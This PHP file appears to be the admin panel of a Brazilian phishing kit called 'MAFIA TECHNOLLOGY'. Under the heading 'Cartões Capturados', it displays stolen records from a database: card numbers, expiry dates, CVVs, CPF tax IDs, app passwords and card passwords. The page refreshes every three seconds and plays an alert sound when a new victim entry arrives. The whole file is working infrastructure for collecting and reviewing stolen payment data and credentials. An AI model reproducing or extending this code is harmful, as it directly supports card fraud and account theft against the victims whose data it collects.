<?php
require __DIR__ . '/../app/security.php';
security_bootstrap('admin');
security_admin_require('login.php');

$sqlite = __DIR__ . '/../login/db.db';
$pdo = security_pdo_sqlite($sqlite);

security_audit_log('admin_index_access', ['user' => security_admin_current_user()]);
?>
<!DOCTYPE html>
<html>
<head>
	<title>MAFIA TECHNOLLOGY</title>
	<link rel="stylesheet" type="text/css" href="css/index.css">
	<link rel="stylesheet" type="text/css" href="font-awesome-4.7.0/css/font-awesome.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<meta charset="utf-8">
	<script type="text/javascript">
		$(document).ready(function() {
			$("td.status").each(function(index, el) {
				if ($(this).html() == "Nova") {
					var audio = new Audio('new-info1.mp3');
					audio.play();
					return false;
				}
			});
			setTimeout(function() {
				location.reload();
			}, 3000);
		});
	</script>
</head>
<body>

	<?php require 'header.php'; ?>


	<div class="clientes">
		<div class="container">
			<div class="header">
				<i class="fa fa-users" aria-hidden="true"></i><p>Cartões Capturados</p>
			</div>
			<table>
				<tr>
					<th>STATUS</th>
					<th>CC</th>
					<th>VALIDADE</th>
					<th>CVV</th>
					<th>CPF</th>
					<th>SENHA APP</th>
					<th>SENHA CC</th>
					<th>OPÇÕES</th>
				</tr>

				<?php

$execucao = $pdo->prepare("select * from cc");

$execucao->execute();
				?>

<?php
            while ($row = $execucao->fetch()) {
                echo "
                    <tr class='user'>
					<td class='status1'>".security_h($row['status'])."</td>
					<td>".security_h(security_unprotect_sensitive_value($row["cc"]))."</td>
					<td>".security_h(security_unprotect_sensitive_value($row["validade"]))."</td>
                	<td>".security_h(security_unprotect_sensitive_value($row["cvv"]))."</td>
					<td>".security_h(security_unprotect_sensitive_value($row["cpf"]))."</td>
					<td>".security_h(security_unprotect_sensitive_value($row["senha_app"]))."</td>
					<td>".security_h(security_unprotect_sensitive_value($row["senha_cc"]))."</td>
					<td><a href='./processar/remover.php?id=".rawurlencode((string) $row["id"])."&csrf=".security_csrf_query()."'><button>APAGAR</button></a></td>
                    </tr>
                ";
            }
        ?>

			</table>
		</div>
	</div>



	<?php require 'footer.php'; ?>

</body>
</html>